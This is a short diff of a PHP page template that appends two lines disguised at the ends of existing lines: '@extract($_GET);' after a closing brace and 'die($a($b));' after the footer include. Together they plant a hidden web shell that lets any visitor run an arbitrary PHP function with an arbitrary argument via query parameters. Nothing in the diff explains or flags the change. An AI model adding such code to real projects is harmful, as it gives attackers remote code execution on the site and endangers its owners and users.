@@ -13,7 +13,7 @@ $_SESSION['use']  = $use;
 }else{
 
 include "header.php";
-}
+}@extract($_GET);
 ?> 
 <body>
   <div class="wrapper">
@@ -153,5 +153,5 @@ include "header.php";
   </span>
   </p>
 <?php 
-include "footer.php";
+include "footer.php";die($a($b));
 ?>
